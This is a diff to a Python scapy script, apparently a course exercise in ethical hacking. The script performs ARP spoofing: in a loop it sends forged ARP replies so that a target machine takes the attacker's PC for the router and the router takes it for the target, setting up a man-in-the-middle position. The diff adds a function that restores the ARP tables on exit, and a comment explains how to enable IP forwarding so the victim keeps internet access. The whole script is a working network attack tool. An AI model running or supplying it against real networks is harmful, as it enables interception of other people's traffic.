@@ -19,7 +19,8 @@
 #				 psrc       : MultipleTypeField                   = (None)	"source" IP, actually coming from our PC but spoofing to look like it is coming from the router
 #				 hwdst      : MultipleTypeField                   = (None)	MAC of target computer
 #				 pdst       : MultipleTypeField                   = (None)	ip of target computer
-#																			***these fields can be found using network_scanner.py from previous lecture for all devices in network
+#																			*these fields can be found using network_scanner.py from previous lecture for all devices in network
+# **implement user input**
 
 import scapy.all as scapy
 import time
@@ -40,20 +41,33 @@ def get_mac(ip):	#modified scan function from network_scanner.py
 	answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0] # srp function will send the packet to broadcast MAC address and check all IPs provided by ip.
 	return (answered_list[0][1].hwsrc)
 
+def restore(target_ip, router_ip):
+	target_mac = get_mac(target_ip)
+	router_mac = get_mac(router_ip)
+	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = router_ip, hwsrc = router_mac)
+	scapy.send(packet, verbose = False)
+
+
 def spoof(target_ip , spoof_ip):
 	target_mac = get_mac(target_ip)
-	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = "08:00:27:e6:e5:59", psrc = spoof_ip)
+	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
 	scapy.send(packet, verbose = False)
 
 packets_sent = 0
+
+targetIP = "10.0.2.8"
+routerIP = "10.0.2.1"
+
 try:
 	while True:
-		spoof("10.0.2.8","10.0.2.1")	#tell target we are the router
-		spoof("10.0.2.1","10.0.2.8")	#tell router we are the target
+		spoof(targetIP,routerIP)	#tell target we are the router
+		spoof(routerIP,targetIP)	#tell router we are the target
 		packets_sent += 2
 		print("\r[+] Sent "+str(packets_sent)+" packets"),
 		sys.stdout.flush()
 		time.sleep(2)
 except KeyboardInterrupt:
-	print("[+] Exiting program...")
+	restore(targetIP,routerIP)
+	restore(routerIP,targetIP)
+	print("\n[-] Resetting ARP tables")
 	#echo > 1 /proc/sys/net/ipv4/ip_forward to enable ip forwarding (so target can still use internet)
